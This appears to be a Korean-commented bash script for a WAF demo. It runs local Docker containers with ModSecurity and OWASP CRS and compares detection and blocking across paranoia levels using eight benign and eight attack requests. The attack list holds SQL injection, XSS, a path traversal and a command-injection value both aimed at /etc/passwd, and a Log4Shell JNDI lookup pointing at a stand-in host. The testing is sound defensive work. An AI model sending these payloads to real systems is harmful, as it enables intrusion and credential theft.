#!/usr/bin/env bash
# nginx + ModSecurity + OWASP CRS 컨테이너에 공격 요청 8건과 정상 요청 8건을 보내, 모드(탐지만/차단)와 민감도(PL1~PL4)별 차이를 확인한다.
# 준비: Docker, python, 같은 폴더에 backend.conf, modsec_summary.py. 내 PC의 컨테이너에만 요청을 보낸다.
# 실행(Git Bash): bash modsec_demo.sh   (약 3분)
export MSYS_NO_PATHCONV=1
HERE="$(pwd)"
OUT=../osk-fc-ms-out                    # 결과 폴더는 규칙 폴더 밖에 둔다
rm -rf "$OUT"; mkdir -p "$OUT"
cleanup() { docker rm -f osk-fc-ms osk-fc-be osk-fc-cli >/dev/null 2>&1; docker network rm osk-fc-net >/dev/null 2>&1; }
cleanup
docker network create osk-fc-net >/dev/null
docker run -d --name osk-fc-be --network osk-fc-net -v "$HERE/backend.conf:/etc/nginx/conf.d/default.conf:ro" nginx:alpine >/dev/null
docker run -d --name osk-fc-cli --network osk-fc-net --entrypoint sleep curlimages/curl 3600 >/dev/null
U=http://osk-fc-ms:8080
# 종류 이름 curl인자... (A 는 공격, B 는 정상)
reqs() {
  cat <<'R'
A sqli|/?id=1%27%20OR%20%271%27=%271
A xss|/?q=%3Cscript%3Ealert(1)%3C/script%3E
A traversal|/?f=../../etc/passwd
A cmdinj|/?host=127.0.0.1;cat%20/etc/passwd
A union|/?id=1%20UNION%20SELECT%20username,password%20FROM%20users
A log4shell|/|-H|User-Agent: ${jndi:ldap://x.example/a}
A scanner-ua|/|-A|sqlmap
A post-sqli|/login|-d|user=admin'--&pass=x
B home|/
B search|/?q=union+station+opening+hours
B select-prose|/?q=please+select+a+size
B json-post|/api|-H|Content-Type: application/json|-d|{"name":"Kim","note":"drop by at 5pm"}
B korean|/?q=%EB%B3%B4%EC%95%88%20%EC%A0%90%EA%B2%80
B js-word|/?q=javascript+tutorial
B apos|/?name=O%27Brien
B sql-words|/?q=how+to+drop+a+table+in+sql
R
}
run_mode() {   # run_mode <엔진> <PL>
  local engine="$1" pl="$2" tag="$1-$2"
  docker rm -f osk-fc-ms >/dev/null 2>&1
  docker run -d --name osk-fc-ms --network osk-fc-net -e PARANOIA=$pl -e BLOCKING_PARANOIA=$pl \
    -e MODSEC_RULE_ENGINE=$engine -e BACKEND=http://osk-fc-be:80 owasp/modsecurity-crs:nginx-alpine >/dev/null
  sleep 6
  : > "$OUT/res-$tag.tsv"
  reqs | while IFS='|' read -r head path a1 a2 a3 a4; do
    kind="${head%% *}"; name="${head#* }"
    args=(); [ -n "$a1" ] && args+=("$a1" "$a2"); [ -n "$a3" ] && args+=("$a3" "$a4")
    code=$(docker exec osk-fc-cli curl -s -o /dev/null -w '%{http_code}' "${args[@]}" "$U$path")
    printf '%s\t%s\t%s\n' "$kind" "$name" "$code" >> "$OUT/res-$tag.tsv"
  done
  docker logs osk-fc-ms 2>&1 | grep '^{"transaction"' > "$OUT/audit-$tag.json"
  echo "## $engine, 민감도 PL$pl"
  python modsec_summary.py "$OUT/res-$tag.tsv" "$OUT/audit-$tag.json" | head -${LINES_MAX:-4}; echo "  종료 코드 ${PIPESTATUS[0]}"
}
run_mode DetectionOnly 1
run_mode On 1
run_mode On 2
run_mode On 3
run_mode On 4
cleanup
echo "## 끝 (결과 폴더: $OUT)"
